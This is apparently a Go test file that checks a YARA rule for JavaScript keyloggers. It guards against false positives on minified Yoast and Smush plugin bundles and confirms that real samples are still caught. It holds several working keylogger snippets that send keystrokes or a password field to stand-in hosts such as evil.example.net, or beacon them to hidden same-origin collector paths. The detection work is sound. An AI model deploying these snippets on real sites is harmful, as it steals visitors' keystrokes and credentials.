//go:build yara

package yara

import "testing"

// Regression tests for the 2026-07-24 exfil_keylogger_js false positives on
// stock minified plugin bundles (Yoast SEO general-page.js). Minified JavaScript
// puts thousands of unrelated statements between semicolons, so correlating a
// key handler with any later network call over a byte window spanning unrelated
// code reports ordinary plugin behaviour as a keylogger. A keylogger must send
// data derived from the captured keystroke, not any form field the bundle reads.

// yoastBundleShape reproduces the real FP: an accessibility keydown handler that
// only calls preventDefault, and a completely unrelated newsletter subscribe
// fetch whose callback later reads an input's .value.
const yoastBundleShape = `).id&&"INPUT"===e.target.tagName&&e.preventDefault()}return addEventListener("keydown",e),` +
	`()=>removeEventListener("keydown",e)}),[]),(0,l.useCallback)((e=>fetch("https://my.yoast.com/api/Mailing-list/subscribe",` +
	`{method:"POST",mode:"cors",cache:"no-cache",credentials:"same-origin",headers:{"Content-Type":"application/json"},` +
	`redirect:"follow",referrerPolicy:"no-referrer",body:JSON.stringify({customerDetails:{firstName:"",email:e},` +
	`list:"Yoast newsletter",source:"free"})})).json()}(r)).error?(s("error"),i(ad)):(s("success"),i(od))}),[r]),` +
	`u=(0,l.useCallback)((e=>{s("waiting"),n(e.target.value)}),[])`

func TestFPKeylogger_StockPluginBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(yoastBundleShape)), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched stock Yoast bundle (accessibility keydown handler + unrelated newsletter fetch)")
	}
}

// A cache-busting analytics bundle that binds keyup for a search-as-you-type box
// and posts the search term. The posted value is the input's own .value, not the
// keystroke, and the handler is a legitimate site feature.
func TestFPKeylogger_SearchAsYouTypeBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legit := []byte(`e.addEventListener("keyup",function(){var q=document.getElementById("s")` +
		`,r=new XMLHttpRequest;r.open("POST","/wp-admin/admin-ajax.php"),r.send("action=search&term="+q.value)})`)
	if hasYaraRule(s.ScanBytes(legit), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched search-as-you-type widget posting its own input value")
	}
}

// Real keylogger: the captured keystroke itself is buffered and shipped out.
func TestFPKeylogger_RealKeystrokeExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`var b="";document.addEventListener("keydown",function(e){b+=String.fromCharCode(e.keyCode);` +
		`fetch("https://evil.example.net/c",{method:"POST",body:b})});`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke buffer exfiltrated to external host not detected")
	}
}

func TestFPKeylogger_RealKeystrokeBeaconStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`window.onkeypress=function(e){navigator.sendBeacon("/wp-content/uploads/log.php","k="+e.key)};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke beacon to same-origin collector not detected")
	}
}

func TestFPKeylogger_RealKeystrokeImageExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`document.onkeyup=function(e){var i=new Image;i.src="https://evil.example.net/p?c="+e.charCode};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: keystroke image-pixel exfil not detected")
	}
}

func TestFPKeylogger_CredentialFieldExfilStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`document.onkeyup=function(){var i=new Image;i.src="https://evil.example.net/p?c="+document.getElementById("password").value};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: credential-field exfil not detected")
	}
}

// smushBundleShape is excerpted verbatim from WP Smush's minified
// smush-tutorials.min.js, the 2026-08-07 false positive: an accessibility
// Enter-key handler COMPARES the key code to a constant
// ((e.which||e.keyCode)===ct.KeyCode.RETURN) ~265 chars before an unrelated
// media fetch, and a React onKeyDown prop elsewhere supplies the key-handler
// token. A comparison never stores the keystroke, so it must not pair with a
// nearby network call the way a capture (+=, push, fromCharCode concat) does.
const smushBundleShape = `-href"),"_blank")})),Ge(Je(t),"handleKeydown",(function(e){if((e.which||e.keyCode)===ct.KeyCode.RETURN)t.openLink(e)})),t.state={media:[],error:null,isLoaded:!1},t.openLink=t.openLink.bind(Je(t)),t.handleKeydown=t.handleKeydown.bind(Je(t)),t}return n=i,(r=[{key:"componentDidMount",value:function(){var e=this,t=this.props.media;fetch("https://wpmudev.com/blog/wp-json/wp/v2/media/"+t).then((function(e){return e.json()})).then((function(t){e.setState({isLoaded:!0,media:t.guid.rendered})}),(function(t){e.setState({isLoaded:!0,error:t})}))}},{key:"render",value:function(){var t=this.state,n=t.media,r=t.error,a=t.isLoaded` +
	`,translate:[{read_article:u,min_read:s}],onClick:function(e){return t.openLink(e)},onKeyDown:function(e){return t.handleKeydown(e)}}))}));return a?e.createElement(Ke,{type:"error"`

func TestFPKeylogger_SmushTutorialsBundle(t *testing.T) {
	s := loadRepoYaraScanner(t)
	if hasYaraRule(s.ScanBytes([]byte(smushBundleShape)), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js FP: matched Smush bundle (Enter-key comparison + unrelated media fetch)")
	}
}

// Keystrokes pushed into an array, then beaconed to a same-origin collector.
func TestFPKeylogger_PushedKeystrokeBufferStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`var q=[];window.addEventListener("keyup",function(e){q.push(e.key);` +
		`if(q.length>=32){navigator.sendBeacon("/wp-content/uploads/.cache/l.php",q.join(""));q=[]}});`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: pushed keystroke buffer not detected")
	}
}

// The keystroke interpolated straight into the exfil URL via a template literal.
func TestFPKeylogger_TemplateLiteralKeystrokeStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte("addEventListener(\"keydown\",e=>{fetch(`https://t.example.invalid/k?v=${e.key}&u=${location.href}`,{mode:\"no-cors\"})});")
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: template-literal keystroke exfil not detected")
	}
}

// Send routine defined before the capture: the sink sits earlier in the file
// than the keystroke accumulation, so the either-order window must still pair.
func TestFPKeylogger_SinkBeforeCaptureStillDetected(t *testing.T) {
	s := loadRepoYaraScanner(t)
	mal := []byte(`function ship(d){var x=new XMLHttpRequest;x.open("POST","//log.example.invalid/i");x.send(d)}` +
		`var log="";document.onkeydown=function(e){log+=String.fromCharCode(e.keyCode);if(log.length>64){ship(log);log=""}};`)
	if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
		t.Error("exfil_keylogger_js regression: sink-before-capture buffered keylogger not detected")
	}
}
